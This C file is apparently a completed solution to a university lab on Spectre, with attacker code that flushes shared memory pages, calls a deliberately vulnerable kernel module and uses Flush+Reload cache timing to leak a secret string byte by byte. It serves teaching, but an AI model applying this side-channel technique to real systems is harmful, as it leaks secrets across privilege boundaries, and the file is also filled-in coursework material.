/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

// Helper method to flush the shared memory pages before the attack
static void flush_shared_pages(char *shared_memory) {
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE));
    }
}

// Helper method to reload each shared page and identify the one the victim touched
static char reload_shared_page(char *shared_memory) {
    const uint64_t reload_threshold = 130; // threshold for distinguishing cache hits vs misses
    uint64_t best_time = UINT64_MAX;
    size_t best_index = 0;

    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        char *addr = shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE);
        uint64_t access_time = time_access(addr);

        // If this access is a cache hit, we can be pretty confident this is the right page and return immediately
        if (access_time < reload_threshold) {
            return (char)i;
        }

        // if this is the best we've seen so far, remember it
        if (access_time < best_time) {
            best_time = access_time;
            best_index = i;
        }
    }

    return (char)best_index;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        flush_shared_pages(shared_memory);
        call_kernel_part1(kernel_fd, shared_memory, current_offset);
        // leaked_byte gives us the index of the shared page that was touched by the victim
        leaked_byte = reload_shared_page(shared_memory);

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
